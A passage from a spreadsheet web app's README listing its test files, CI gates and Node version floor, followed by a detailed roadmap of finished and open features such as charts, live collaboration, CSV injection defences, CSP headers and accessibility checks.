| `SUM(A1:A3)` over 1, TRUE, 2 gave 4 | Excel gives 3: a logical value in a *cell* is ignored, while one passed as an argument still counts. A number that is one too high looks exactly like a number that is right |

Both are fixed and pinned by example tests. **And the properties themselves were proved by breaking
things**: make `a-b-c` parse as `a-(b-c)` — destroying left-associativity — and the property fails at
once, while **all 147 of the engine's example tests still pass**. That is the entire argument for this file, in one
measurement.

**Each gate was proved by breaking it first** — take `say(...)` out of `addRow` and the fifth flow fails at
once; disable `ArrowRight` in the grid and two assertions in the third fail. (The first attempt at that
second one stayed green: the `case` I inserted landed *after* the existing `case "ArrowRight"` and was dead
code. Proving a gate means checking that the thing you meant to break actually broke.)

> **1638 tests passed, and 43% of the assistant's answers were unusable** — because those tests mock
> the model, so it returns what the test author imagined. A test count says what you thought to ask,
> not whether you asked enough. Only a real API key found this: see
> [What 1638 passing tests could not catch](#-what-1638-passing-tests-could-not-catch), repeatable
> with `npm run check:ai`.

| File | Cases | Tests |
|---|---|---|
| `tokenizer.test.ts` | 10 | Literals, cell/range refs (including absolute `$`), operators, string escaping, the `#REF!` token |
| `property.test.ts` | 9 | Property-based: each test generates hundreds of formulas and checks a rule that must always hold — arithmetic against an oracle sharing no engine code, precedence on expressions with no parentheses at all, evaluation never throwing, a zero shift being identity, two shifts equalling the shift of their sum, insert-then-delete of a row leaving every reference where it was, and SUM against adding the cells by hand |
| `csvInjection.test.ts` | 11 | CSV injection from the attacker's side: every DDE payload has to leave unable to run, from the export button and from the crash rescue alike · negative numbers, Thai text and blanks must be untouched · export-then-import returns the original however many times it goes round |
| `xlsxFormulaExport.test.ts` | 4 | An exported `.xlsx` holds only formulas the engine can read: `=1+1` from a CSV is still a formula, one the engine cannot read goes out as text, on both the CSV → xlsx and xlsx → xlsx paths · opening that file again keeps it text |
| `arrayFormulas.test.ts` | 27 | Formulas that answer with a shape and where the answer lands: spilling into the right cells, `#SPILL!` when something is in the way or the sheet ends and **nothing written at all when it refuses**, a formula reading spilled cells getting the right total even when it sits above the array, operators applied across a range, and all five array functions |
| `sheetCodec.test.ts` | 12 | What is written to localStorage costs what was typed rather than what the sheet is sized to, pack/unpack returning every cell and format, saves in the old shape still loading and still rescuable after a crash, and malformed keys or out-of-bounds cells never losing data |
| `saveHealth.test.ts` | 9 | A save the browser refuses becomes a status rather than an exception, "full" told apart from "disabled" in every spelling browsers use, the last good save left in place, recovery the moment a save lands, and listeners told when the status changes rather than on every keystroke |
| `saveFailed.test.ts` | 3 | The real store over a full storage: edits still land in memory, **export still produces a file** (the bug PaynEat ERP's large template hit was a silent Export button), and the status clearing once a save lands again |
| `crashRescue.test.ts` | 19 | Rescuing the sheet out of every broken shape localStorage can hold (no key, unparseable JSON, wrong types) without throwing, filenames Windows accepts, and the storage key matching what the store actually writes |
| `parser.test.ts` | 20 | Operator precedence/associativity, ranges, function calls, syntax errors, arguments left out mid-call |
| `evaluator.test.ts` | 10 | Arithmetic, comparisons, concatenation, reading cells/ranges, error propagation |
| `functions.test.ts` | 136 | The whole function library across aggregate/rounding/logic/text/lookup, including Excel's own results for ROUND (half away from zero, several decimals, negative digits), POWER/`^`/SQRT, AVERAGEIF and LEFT/RIGHT/MID, INDEX/MATCH (leftward lookups, whole rows/columns, unsorted data), SUMIFS (several conditions, mismatched ranges), XLOOKUP (leftward lookups, a not-found fallback, nearest match on unsorted data, searching from the end) and DATEDIF (all six units, the month borrow, dates that don't exist) — plus dates that must not shift across timezones |
| `formulaCatalog.test.ts` | 12 | What the palette actually builds: criteria quoting, a half-filled second condition, and every formula having text in both languages |
| `shift.test.ts` | 10 | Relative reference shifting on copy/paste; absolute references staying put |
| `structuralShift.test.ts` | 16 | Reference adjustment on row/column insert/delete, including `#REF!` and range grow/shrink |
| `sheetSort.test.ts` | 7 | The bounds/header-detection heuristic, and sorting itself (blank values, limited column scope) |
| `jsonToTable.test.ts` | 14 | Finding the record array in a response, flattening nested objects, numeric-column detection, single-row KPI objects, an empty list in an envelope as no rows rather than a row of the envelope (#65), CSV codes keeping their leading zeros all the way to the sheet (#36) |
| `excelDate.test.ts` | 7 | Dates as Excel keeps them (#45): 1900-system serials matching Excel, including its 29 Feb 1900; the ISO forms read as dates (others stay text); Excel date format codes (`dd/mm/yyyy`, `d-mmm-yy`, `h:mm AM/PM`) |
| `dates.test.ts` | 14 | Dates in a sheet (#45): the issue's table (`=A2-A1` = 36, `=A1+30`, `=A3*24`), YEAR/DATEDIF on serials and ISO text, a sheet saved before the fix opening with dates, charts and CSV using dates as labels, export as real date cells, import keeping the time and the file's layout (`dd/mm/yyyy`, a time alone, midnight), and the PaynEat ERP import template round-tripped with every sheet's size and every date unchanged |
| `paginate.test.ts` | 19 | Detecting the next page from a Link header / next field / cursor / a URL param, stopping on an explicit null, refusing non-link values |
| `executeSource.test.ts` | 47 | The real fetch loop (stubbed fetch): row limits, the 20-page ceiling, loop guards, a failing mid-chain page, column union across pages, the auth header on every page of its own origin and on no other, a mid-chain 429, and the SSRF guard on the path that actually fetches (including a redirect to a private address) |
| `rateLimit.test.ts` | 20 | Parsing `Retry-After` (seconds and HTTP-date) and every `X-RateLimit-Reset` shape, separating a quota-exhausted 403 from a plain one, backoff maths |
| `sheetMerges.test.ts` | 35 | Which cells a merge swallows, shifting merges on row/column insert and delete, dropping one that collapses to a single cell |
| `sheetTemplate.test.ts` | 14 | Which cells are locked vs. fields, inline and range-backed dropdown options, column-width conversion |
| `excelIO.test.ts` | 51 | Builds a real .xlsx and round-trips it: reading fields/dropdowns/widths, an unprotected file isn't a template, export→import comes back identical, and styling (fills/font sizes/borders/row heights/merges) round-trips, as do all five kinds of conditional formatting rule and cell notes (both the plain-string and Excel's rich-text form), cross-sheet dropdowns read from the sheet the rule names (quoted names, a hidden sheet, a missing one, and the PaynEat ERP draft-0 template) |
| `charts.test.ts` | 42 | Reading a range into series and labels (including a text label column), gaps for non-numbers, a zero-anchored axis, moving/resizing/clamping a chart's frame, what the legend names per kind, shifting on edits |
| `server/urlGuard.test.ts` | 31 | Addresses the server refuses to reach (loopback, private ranges, cloud metadata, IPv6 link-local), IPv4 embedded in IPv6 (`::ffff:`, `::`, SIIT, NAT64, 6to4, Teredo), non-http schemes, and the allowlist |
| `server/sourcesAuth.test.ts` | 9 | No token means off, right/wrong/prefix tokens, and telling "switched off" apart from "wrong token" |
| `server/secretBox.test.ts` | 10 | Encrypting and decrypting a credential, non-repeating ciphertext, tamper detection, refusing with no key, and reading pre-existing plaintext |
| `cloud/cloud.test.ts` | 24 | On/off from the environment (a half-set deployment included), the stored shape and its JSON round trip, refusing a workbook from a newer version, and spotting another device's save |
| `cloud/liveSession.test.ts` | 22 | The live-editing rules: own echo, a tab that isn't here, a structural change → reload, the cell being edited → wait, a message that lost → drop · ties broken by client id, and both sides reaching the same answer |
| `cloud/liveMessage.test.ts` | 7 | Validating what arrives from another browser (also counted among the security tests) |
| `cloud/liveRoom.test.ts` | 21 | One room against a fake transport: an echo staying out of undo, an edit held until the editor closes (only the winner kept), a local edit that wins not being overwritten, and leaving actually going quiet |
| `cloud/sheetDiff.test.ts` | 11 | What changed between two workbooks: one cell, an emptied cell, another tab, an added row → reload, 200+ cells at once → reload · and a count of how many rows were read, so copy-on-write staying true is a test |
| `cloud/realtimeChannel.test.ts` | 9 | Turning presence into a list of people — where `id` and `from` disagreed and quietly produced "nobody else is here" |
| `precedents.test.ts` | 11 | Which cells a formula is about: every argument rather than the first, through arithmetic and nested calls, a cross-sheet reference dropped rather than drawn at the same address here, and a whole-column range measured before it is built rather than after |
| `dataValidation.test.ts` | 28 | What a cell will accept: empty values and formulas always pass, rules move with inserted and deleted rows, a list containing a comma is refused rather than written truncated, and a validation type this app has no equivalent for is ignored rather than approximated |
| `namedRanges.test.ts` | 26 | Named ranges: a name that is also an address, has a space, or is reserved is refused with the reason; the name is substituted throughout the tree; precedents point at the real rectangle; repointing a name really does recompute (the cache is keyed by the name table); and a name does not shift when filled |
| `store/sheetRules.test.ts` | 11 | Both features at the store: a value outside the rule is not saved and is announced, rules and names follow row edits, deleting a name leaves the formula reading `#NAME?` rather than rewritten, and undo brings the name back |
| `store/liveBlockStructure.test.ts` | 8 | Live data and row/column edits (#46), through the real store and then a refresh: the block moves with them, a total under it is not written over, an edit inside it is refused with the reason, deleting its header unlinks it and keeps the values, and undo brings the linked block back |
| `store/liveEmptyResult.test.ts` | 2 | A source answering with an empty list (#65): the block keeps its last header, the rows under it are cleared, a SUM reads 0 rather than the envelope, and it fills again when rows come back |
| `store/workbookCompute.test.ts` | 3 | Every path in the store computes with the workbook (#58): a pivot counts a value read from another sheet (175.3, not 105.3), a sort orders cross-sheet values by their numbers, and a guard that fails on any bare `computeSheet` outside the engine |
| `store/datePivot.test.ts` | 1 | A pivot by day (#45): its rows are headed with dates, not serials |
| `store/dateEntry.test.ts` | 5 | Entering a date as a person does (#45): `=TODAY()`/`=DATE()`/`=NOW()` formatted as dates while the cell is General, a date and time widening a default-width column, picking a date format replacing the file's layout |
| `store/sampleNotice.test.ts` | 19 | Opening blank, the sample opened by its button and undone, a sample left in the browser (either language) not restored while one edit of any kind makes it work, New file undone and announced, the sample notice only while untouched, and the sample following the language on screen |
| `store/liveStore.test.ts` | 12 | The wiring, with the socket replaced by a function call: a keystroke reaching the wire, an arriving edit reaching the document, the two not feeding each other for ever, and undo not erasing the other person's work |
| `pdfFont.test.ts` | 5 | Embedding the Thai font, fetching it once per page, and falling back to the built-in font rather than failing the export |
| `cellComments.test.ts` | 17 | Writing and clearing a note, trimming, following an insert/delete, and a note going with the row it was written about |
| `gridGeometry.test.ts` | 24 | Pixel positions of rows and columns (including widths/heights from an import), filtered-out rows taking no height, where a new chart lands and how it steps clear of one already there, anchor↔pixel round trips |
| `chartGeometry.test.ts` | 14 | The shapes a bar/line/pie is made of: bars inside the plot and scaled to their value, a line broken at a gap, a pie following the chosen series, labels thinning out when the room runs out |
| `chartImage.test.ts` | 10 | The exported picture: a complete SVG document, the legend carried into it, XML escaping, and null when there is nothing to draw |
| `conditionalFormat.test.ts` | 33 | Compare/text/rank rules (ties included), colour scales (including an all-equal range), data bars (including negatives), stacked rules, range shifting on insert/delete |
| `apiOrigins.test.ts` | 9 | Which origins the CSP takes from the cookie (https or localhost only; everything that could widen the policy or end a directive refused), the proxy's policy unchanged for someone who never added a source and one origin longer for someone who did, no directive or wildcard injected |
| `dataSources/browserSource.test.ts` | 10 | Fetching an API from the browser (stubbed `fetch`): the header only to its own origin, a next page on another origin never followed, JSON and CSV, plain http on the network refused before sending (localhost allowed), the error codes it can tell apart (unreachable/CORS, refused credentials, a status, not a table), header values `fetch` cannot send, an empty page as no rows and several empty lists not guessed at (#65) |
| `liveBlocks.test.ts` | 15 | Writing/clearing a live block, shrinking extents, sum/avg/count, which value options are offered, region-occupied checks |

CI: `npm run verify` bundles it — `lint` → `check:readme` → `test` → `build` (the build also type-checks the
whole project, including the two languages' `Messages` parity). **It has to be green before every push**; the
full rule lives in `AGENTS.md`.

**GitHub Actions** (`.github/workflows/ci.yml`) runs those same five gates on every push and pull request,
across **Node 22.12 and 24** — exactly what `engines` declares, so the 22.12 floor is tested rather than
asserted. They run as separate steps so the run summary names the gate that failed instead
of showing one opaque red cross.

Testing the real floor caught the same class of bug twice, and both times it was "the documented minimum
doesn't actually work": first `check:readme` died on `import.meta.dirname` (Node 20.11+), then `npm test` died
instantly because Vite 7 is ESM-only and needs `require(esm)`, which exists only from 20.19/22.12. This
project's true floor comes from Vite, not Next — which is only knowable by running CI on it. The 20 line has
since been dropped as past end of life ([#68](https://github.com/SuruchBoss/ExcelToGo/issues/68)), leaving 22.12
as the one floor.

**On Vercel:** Vercel reads `engines` and picks the newest major inside the range, so it builds on **24.x** —
and because the range does not reach the next major, Vercel will not quietly move to it. A new Node major goes
into CI and `engines` together.

---

## 🔭 What's next

What's not done yet, and why — to show this is a known gap, not something forgotten:

- [x] **Automated CI (GitHub Actions)** — done: lint → check:readme → test → build on every push and PR,
      across Node 22.12 and 24
- [x] **Cloud save / cross-device sync** — done as **bring-your-own-backend** (see ✨ Features):
      point it at your own Supabase project. Off by default, because this is an open-source project
      rather than a hosted service. Sharing a workbook with another account shipped with the live
      session that needed it. Still open: automatic sync (version history is done — see its own item below)
- [ ] **Invite by user id, not by email address** (proposal) — today a share is matched against the
      email in the sign-in token, so it is only safe while the Supabase project enforces email
      confirmation (see ⚠️ under cloud save). Resolving the invitee to an `auth.uid()` once they have
      signed in, and matching on that, would remove the dependency on a setting this app cannot see.
      Also worth a policy test pinning the behaviour for a confirmed vs an unconfirmed address
- [x] **Simultaneous editing** — done, over your own Supabase Realtime (see ✨ Features): people see
      each other type, presence shows where each cursor is, the cell you have open is never
      overwritten mid-word, and your undo does not erase their work. **Not a CRDT** — one cell typed
      into twice at once leaves one value and tells the person who lost, and row inserts save and ask
      the others to reload. Still open: formatting, charts and comments are not synced live
- [x] **Charts/graphs** — done (see ✨ Features): bar, line and pie drawn from a range and following
      the live values, placed on the grid, dragged and resized there, anchored to a cell, and carried
      into both the `.xlsx` and the PDF. **A chart in the `.xlsx` is now a real, editable chart** —
      the OOXML chart parts are written by hand and spliced into what ExcelJS produces. Still open:
      charts in the PDF are still pictures (jsPDF has no chart primitive), and a pie draws one
      series at a time
- [x] **Pivot tables** — done (see ✨ Features): group by several columns, fan one field out across
      the top, summarise with sum/count/average/min/max, and get an ordinary sheet back that can be
      sorted, charted and exported. **A summary sheet now remembers its source** and offers a
      Refresh button once the numbers behind it move. Still open: refreshing is manual, one column
      field at a time, and no filters of its own
- [x] **A ceiling on `/api/ai/formula`** — done: 20 calls a minute per address, refused with `429`
      and a `Retry-After`. Still open: the counters are per process, so this guards against casual
      abuse rather than acting as a billing control across instances
- [x] **The sheet size ceiling** — done (`sheetCodec.ts`): **measured before it was changed.** A
      20,000 × 26 sheet holding a single value wrote 4,141 KB to `localStorage` against a ~5 MB quota —
      a ceiling set by the sheet's *dimensions*, not by anything anyone typed, and that
      `JSON.stringify` ran on every keystroke. Only the cells holding something are stored now, and the
      same sheet costs under 5 KB. The in-memory model stays a full grid, because the benchmark says it
      is already fast there (84ms to compute 20,000 × 26 from cold). Saves in the old shape still load,
      and the crash rescue reads both. Still open: a sheet's row count is fixed rather than growing when
      you type past the bottom.
- [x] **Formulas that answer with a whole table** — done (see [array formulas](#-formulas-that-answer-with-a-whole-table-array-formulas)):
      `SEQUENCE`, `TRANSPOSE`, `UNIQUE`, `SORT` and `FILTER` spilling into the cells beside them, `#SPILL!`
      when they do not fit with nothing written, and operators applied across a range (`A1:A9>50` is nine
      answers). **A sheet with arrays on it now recomputes incrementally too** — spill regions went into
      the dependency graph, and a keystroke on a 3,000-row sheet holding one went from 26.4 ms to 2.3 ms.
      Still open: no `XMATCH`, `LET` or `LAMBDA`.
- [x] **Formulas across sheets** — done (see [formulas across sheets](#-formulas-across-sheets)):
      `=Sheet2!A1`, Thai names unquoted, cross-sheet staleness that follows a chain rather than one
      link, and cycles that span sheets. **This line used to say "`.xlsx` export writes computed
      values, so a round trip loses the formula", and that was not true** — the writer has been
      sending `{ formula, result }` for a long time, and plain formulas, cross-sheet references and
      `$A$1` all come back intact. A limitation nobody re-checks outlives the bug it described, so
      the claim is pinned by tests now instead of by memory: make the writer emit numbers instead
      of formulas and four of them fail immediately.
- [x] **The fill handle** — done (see [the fill handle](#️-the-fill-handle)): numbers, Thai days and
      months, quarters, `Item 08`, and formulas whose references move. Still open: dragging *inwards*
      to clear, and Excel's right-drag menu of fill options.
- [x] **Find and replace** — done (see [find and replace](#-find-and-replace)). Still open: searching
      the displayed value as well as the raw text, and regular expressions.
- [x] **Freezing panes** beyond the already-sticky header row/column — done (see [the Excel keyboard](#️-the-excel-keyboard)):
      the split lives on the sheet, so it survives a reload, goes into undo, follows a row inserted above
      it, and carries into `.xlsx` both ways. Still open: no split at an arbitrary scroll position, only
      at the cursor, which is the shape Excel's own button has.
- [x] **Conditional formatting** — done (see ✨ Features): compare/text/rank/colour scale/data bar,
      written into and read back from `.xlsx`. Still open: icon sets and custom-formula rules
- [x] **Cell comments** — done (see ✨ Features): a note per cell with an amber corner, following
      edits to the sheet, and exported as a real Excel note. Still open: an author and timestamp,
      and threaded replies
- [x] **`INDEX`/`MATCH`, `SUMIFS`, `COUNTIFS`, `AVERAGEIFS` and wildcards in criteria** — done
      (see Supported functions): lookups that read leftwards, and counting/summing/averaging on
      several conditions at once
- [x] **`XLOOKUP` and `DATEDIF`** — done (see Supported functions): a lookup whose key column
      needn't be leftmost, matching exactly by default and taking its own not-found value, plus date
      gaps in all six units (which turned up a bug where `DAY`/`MONTH`/`YEAR` were a day out west of
      UTC)
- [x] **Mobile/tablet support** — done (see ✨ Features): a tab bar with a name on every tab, a menu and a
      cell tools sheet instead of rows that scrolled off screen, a second tap edits a cell, 44px targets, and
      a range is dragged out with a finger from a grip on the selection's corner (which scrolls the sheet to meet it)
- [x] **Finding how to connect an API or database on a phone** — done: the menu's first line, the "Connect your
      API" button at the top of the live-data panel, and the [in-app guide](#-connect-your-own-data-the-in-app-guide)
- [x] **Connecting your own API on the public site, from the browser (#110)** — done (see
      [From your browser](#from-your-browser-restcsv--works-on-this-site)): REST/CSV the user's machine can reach,
      nothing to install, the URL, header and data never through our server · the CSP opens only the origins that
      user added · the header value lives only in the tab · an API that cannot be reached gets a checklist for IT
      instead of a bare error
- [x] **No more "demo" (#109)** — done: the public site is the app people use; the word is gone from the app,
      `/guide` and the landing page (an e2e flow checks both languages) · the three sample sources are gone from the
      UI · server-side sources appear only when `SOURCES_ADMIN_TOKEN` is set · `NEXT_PUBLIC_DEMO_MODE` now means
      only "server-side sources off" and no longer hides `ANTHROPIC_API_KEY`
- [ ] **"Remember the token on this device", opt-in** — the header value now goes when the tab closes, which is
      right for a shared computer and a nuisance on your own. If it is built it has to be opt-in per source, and
      thought through so it does not simply become `localStorage`
- [ ] **Company cookie / single sign-on auth** — requests always go with `credentials: "omit"`; `include` would
      need the API to answer `Access-Control-Allow-Credentials` with no `*` origin. Not designed yet
- [ ] **OAuth** — not there; only a header you type in
- [ ] **A follow-along sample** to replace the three sample sources that were removed — the list in
      `src/lib/server/demoSources.ts` is kept for it
- [ ] **Private Network Access tested against a real internal IP** on Chrome, Edge and Safari — point three of the
      checklist for IT has never been tried on a real machine, which is why it says "may"
- [ ] **PaynEat ERP answering CORS for this site** — the first real case of connecting from the browser; wherever
      it gets stuck is what the checklist is missing
- [x] **Italic / underline** — done: long in the model, now with buttons
- [ ] **Server-side sources on Vercel** — connecting from the browser works on Vercel now (#110), but server-side
      sources are still kept in `data/sources.json`, which Vercel cannot write; they need to move into a database
      (Supabase, which the app already supports) first
- [ ] **Tell "not switched on on the server" apart from "wrong token"** — the server already answers
      differently (403 / 401), but the token box shows one message for both; there is a link to the guide at the foot of the panel instead
- [ ] **Ctrl+B / Ctrl+I / Ctrl+U** — the buttons exist, the shortcuts don't yet
- [ ] **Nothing compares the in-app guide with the README** — when an env var or a step changes, `/guide` has
      to be updated by hand
- [x] **Accessibility checks in CI** — done: `npm run check:a11y` runs axe (WCAG 2.0/2.1/2.2 A+AA) on both
      pages at 390px and 1280px and checks for sideways scroll at five widths, as its own CI job. **Two
      widths is the whole point** — the previous audit ran at desktop width only and reported zero
      violations while eight buttons below 640px had no accessible name. **It now also opens things before
      checking them** — the shortcut dialog passed every load-time scan while containing two serious
      violations, because it does not exist until you press a button; a state that cannot be opened fails
      the gate rather than being skipped. **Every panel is now in that list** — formula palette, AI
      assistant, live data, conditional formatting, charts, pivots and find/replace, 30 checks in all — and
      the first run that opened them found two more straight away: `zinc-400` text on white in the AI panel
      (2.85:1), and two `<select>` elements in the conditional-formatting panel with **no accessible name at
      all**, which axe rates critical. A `<label>` sat above them without an `htmlFor`, which looks
      associated and is not. Both fixed. Still open: the cloud panel (no button unless a backend is
      configured) and the live-data picker, which needs a source first. Now 55 checks — most recently the
      connect-from-this-browser form, and the checklist for IT it shows when a connection fails.
- [x] **Property-based testing for the engine** — done: `property.test.ts` names no formula at all,
      only rules that must hold for every formula, checked against thousands of generated ones with a
      hand-written generator and shrinker and a replayable seed. It found two real gaps on its first run
      (`TRUE()` failing to parse, `SUM` counting logical values sitting in cells), both now fixed. Still
      open: no property covers the `.xlsx` round trip, and the cross-sheet resolver is not generated against.
- [x] **Mutation testing** — done: `npm run check:mutants` breaks the engine one character at a time and
      checks the suite goes red, hand-written rather than Stryker so nothing new is installed. The first run
      left six survivors and six tests were written from them, each covering a specific way of being wrong
      that nothing was watching. The pinned sample now kills 32 of 32; it is drawn by what each site is rather
      than where, and an equivalent mutant carries its reason next to the code. Still open: it only covers the formula engine, and one whole suite run per
      mutant means it cannot cover much more without getting slow.
- [x] **Supply-chain and size gates** — done: `check:deps` requires every advisory to be fixed or written
      down with a reason *and a review date*, so an accepted risk expires instead of becoming a habit; two
      are currently accepted and both say why. `check:bundle` carries written size budgets and checks the
      Supabase client is still in a chunk of its own, with a browser flow proving nothing asks for it.
      CodeQL runs weekly as well as on every push, because an advisory that lands next month is new
      information about code that has not changed. Still open: no gate on what a *page load* transfers,
      only on what is built.
- [x] **A gate for stale screenshots** — done: `check:screens` has each image declare which counted
      figures it prints, records them at retake, and names the file when a count moves without one. It
      cannot read pixels; it notices the world moving under them, which is what let an image reading
      "519 tests" survive for days, and then one reading "980 tests". <!-- historic --> Still open: nothing watches a screenshot whose *layout* went
      stale, only its figures.
- [x] **Crash reports for the operator** — done: both error boundaries post a scrubbed report when
      `NEXT_PUBLIC_ERROR_REPORT_URL` is set, and nothing at all when it is not. What a report may contain
      is a fixed list; keys, tokens, emails and Thai text come out of the stack first, and the endpoint's
      origin joins `connect-src` automatically. Still open: nothing reports an error that is *caught* —
      a failed import or a refused fetch is still only a message on screen.
- [x] **Show what a formula reads** — done (see [see what a formula is about](#-see-what-a-formula-is-about)):
      the cells outlined on the grid and the ranges written out beside the formula bar, which is the
      accessible half and turns out to be the more useful one. Still open: nothing shows the other
      direction — which formulas read *this* cell — which is the question you ask before deleting a row.
- [x] **Works offline** — done (see [opens with the network off](#-opens-with-the-network-off)): a
      hand-written service worker caches the app itself, a manifest puts it on a home screen, and the
      e2e gate switches the network off and reloads to prove it. Navigations are network-first so a
      stale document never outlives its build; `/api/*` is never cached, because a stale number
      presented as a current one is this project's least acceptable failure. Still open: nothing in
      the UI says "you are offline" — the parts that need a network simply fail the way they always did.
- [x] **Page setup for print** — done: type sized from the sheet's width against A4's real usable
      space, the frozen rows repeated as a heading on every page, and page numbers so a printed stack
      can be put back in order. Still open: no dialog — margins, a chosen scale and a print range are
      the parts one would add, and the defaults are right often enough that it would mostly be a thing
      to click through.
- [x] **Version history** — done: a database trigger keeps the copy each save replaced, twenty per
      workbook, readable by whoever can open the workbook and writable by nobody. Still open: no diff
      between two versions, so "what changed" is still a question you answer by looking.
- [x] **A Content-Security-Policy and the rest of the security headers** — done (`next.config.ts`):
      `connect-src` names only `api.anthropic.com` and the Supabase origin when one is configured, so an
      injected script cannot send the visitor's API key anywhere, alongside `frame-ancestors`,
      `object-src`, `base-uri`, `form-action`, `Referrer-Policy`, `nosniff` and `Permissions-Policy`.
      It is a flow in `check:e2e`, proved by removing the header and watching the gate fail. **`script-src`
      no longer carries `'unsafe-inline'`** — `src/proxy.ts` mints a per-request nonce alongside
      `'strict-dynamic'`. SRI was tried first to keep pages prerendered and does not work: an inline
      script is not a file and cannot be hashed, so the page never hydrated at all. The price is
      prerendering, measured at +10–15 ms of TTFB · an API a user connects from the browser enters that one
      user's `connect-src`, through a cookie validated entry by entry. Still open: CSP cannot stop a top-level navigation.
- [x] **Tests that actually open the app (E2E) in CI** — done: `npm run check:e2e` drives Chromium
      through 23 flows as its own CI job — a formula recalculating on screen, an `.xlsx` round trip through
      the real buttons, keyboard-only navigation, undo, and whether anything is announced. Three bugs this
      project previously found by hand are now inside the gate's reach, and each gate was proved by breaking
      it. **The AI assistant is now covered too**, with `/api/ai/formula` stubbed: the range the panel
      sends (the shipped bug counted the header row into it), the suggested formula actually computing once
      inserted, and a 429 telling the person how many seconds to wait instead of failing quietly. Still
      open: charts, pivots and touch drag-select.
- [x] **The grid speaks the ARIA grid pattern** — done: `role="grid"`, row/column counts and per-cell
      indices that survive virtualization, `scope` on both header directions, `aria-selected`, one
      roving tab stop, and focus that follows the cursor. Found by using the app with the keyboard,
      not by any gate — axe passed all four runs while it was still an undriveable table. Still open:
      none of it is verified against a real screen reader.
- [x] **A spoken summary of what happens away from the cursor** — done: a polite live region says what a
      sort, filter, paste, clear, merge, insert, import or undo just did, with the numbers (`Filtered
      column B: 4 of 9 rows shown`), including charts appearing, changing kind and going, and a pivot
      being built or refreshed with its real size. Two regions alternating, because a screen reader
      announces on text *change* and sorting the same column twice writes the same words. Moving the
      cursor stays silent — focus already announces the cell, and saying it twice is worse than not
      saying it. Deliberately silent, each with a test saying so: live data, which re-polls on a timer,
      and the pie-series picker, which is a native select that announces itself. Still open: as above,
      no real screen reader has heard any of it.
- [x] **A keyboard-shortcut reference in the app** — done (see [the Excel keyboard](#️-the-excel-keyboard)):
      `Ctrl`/`Cmd`+`/` or `F1`, or the button at the end of the sheet-tab strip. The list is kept honest by
      a test that reads the handlers' source, so a key cannot be added, renamed or removed without the sheet
      failing. Still open: it covers the grid and the global handlers, not the keys inside individual panels.
- [x] **Direct CSV import/export** — done (see ✨ Features): the delimiter is sniffed (`,`, `;`, tab), the BOM
      is stripped on the way in and written on the way out so Excel reads Thai, quoting follows RFC 4180, and
      the export carries computed values, **and CSV injection is neutralised** without touching negative
      numbers or changing this app's own round trip. Still open: non-UTF-8 files.
- [x] **Merge cells** — done (see ✨ Features): one button for merge and split, overlapping merges are
      absorbed, it asks first only when data would be lost, and the export carries real `<mergeCell>`
      elements. Still open: vertical centring, and freezing beyond the already-sticky headers.

- [x] **Template support for imported files** — done (see ✨ Features): cell locking, dropdowns and column
      widths are read from a protected file, every route into the structure is guarded, and export puts the
      template back together
- [x] **Imported files keep their look** — done: fills, font sizes, borders, row heights and merged cells.
      Still open: images/charts, and authoring a template in-app
- [x] **Live data from REST API / CSV** — done (prototype, see ✨ Features), polling-based refresh
- [x] **Following paginated APIs** — done: auto-detected from a Link header / next field / cursor / a param
      already in the URL, and the user is told when the data came back incomplete
- [x] **Rate limits explained to the user** — done: reads `Retry-After`/`X-RateLimit-Reset`, genuinely stops
      polling for the duration, exponential backoff for ordinary failures, shown in plain language with a
      live countdown
- [x] **Recalculate only what changed, and stop rendering rows nobody can see** — done (see
      [the formula engine](#-formula-engine)): an AST cache plus a dependency graph read off the
      syntax tree takes one edit in a 3,000-row sheet from **1,244.9 ms to 3.6 ms**, and a
      5,000-row sheet keeps 41 `<tr>` in the DOM. Still open: editing the cell a whole column of
      running totals reads still costs around 1,000–1,200 ms (a real fan-out, not a cache miss), and columns
      are not windowed, only rows.
- [x] **Full Excel keyboard coverage** — done (see [the Excel keyboard](#️-the-excel-keyboard)):
      `Ctrl+arrow` to the edge of the data, `Shift+arrow` to drag the selection, both together for
      each at once, `Home`/`End`/`Ctrl+Home`/`Ctrl+End`, Page keys measured in pixels, the two-step
      `Ctrl+A`, and the view following the cursor in both axes. **`Ctrl+Space` / `Shift+Space` for a
      whole column or row and `Ctrl+Enter` to fill a selection are all in now** — and the fill shifts
      references the way a drag does, since a formula that kept pointing at the anchor's row would
      fill a column with the same wrong number. Still open: freezing panes beyond the sticky header.
- [x] **Data validation** — done (see [Data validation](#-data-validation)): a list, a number range or a
      length cap, refused before it is written and announced, moving with row edits and round-tripping
      through `.xlsx`. Still open: "date between" and custom formulas, and a list containing a comma
      cannot be written to the file.
- [x] **Named ranges** — done (see [Named ranges](#-named-ranges)): Thai names work, substitution happens
      at compile time so the dependency graph stays honest, names follow row edits, and they round-trip
      through `.xlsx`. Still open: a name belongs to its sheet rather than the workbook, and there is no
      name box beside the formula bar to jump to a range.
- [x] **Database sources (Postgres/MySQL)** — done (see [Straight into a database](#-straight-into-a-database-postgresql--mysql)):
      tech saves a connection string and a query once, users only ever see the table, and the statement runs
      in a read-only transaction. Still open: a table picker instead of typed SQL, and a test that connects to
      a real database — today only the pure modules around it are covered.
- [ ] **A smarter fallback when there is no API key** — it answers `=SUM(A1:A10)` to nearly any question containing
  "total", and ignores the selected range too. Found while shooting the landing page's problems section, which is
  why problem 01 there says a key of your own is needed rather than promising a SUMIF from plain Thai
- [ ] **Retake `04-ai-assistant.png` with a real key** — both languages are retaken with today's toolbar, but they
  show the keyword matcher,
  which says on screen that it is guessing, because retaking it without a key would mean faking the assistant's
  answer. With a key, `SCREENSHOT_ANTHROPIC_KEY=… npm run screenshots -- --only 04` retakes both with a real one
- [ ] **The AI's range guess stops at a blank row** — with the cursor under one empty row (C12 in the sample),
  the range sent is the cursor cell alone and the answer is `=AVERAGE(C12)`. Found while writing the screenshot scenes
- [x] **Screenshots in both languages** — the English README used to show the Thai app in 43 of its 44 pictures.
  Every picture now comes from one script (`npm run screenshots`), and `check:readme` fails a README that shows
  the other language's set. Found and fixed on the way: `SORT(…,-1)` sorting the wrong way, the English toolbar
  overflowing a 1366px laptop until the language toggle was cut off, and two live-data windows that never said
  they were dialogs
- [x] **Leading zeros stay (#23)** — phone numbers, ID cards and codes are text from the moment the sheet
      computes, by one rule the `.xlsx` writer shares (see
      [Phone numbers and codes keep their zeros](#-phone-numbers-and-codes-keep-their-zeros))
- [ ] **`SUM`/`AVERAGE`/`COUNT` skip text in a range, as Excel does (#38)** — today number-looking text is added in
- [x] **Live CSV data uses the same rule (#36)** — done: leading zeros in live CSV data stay
- [x] **Dates are dates (#45)** — done (see [Dates and times](#-dates-and-times)): Excel serials, times kept
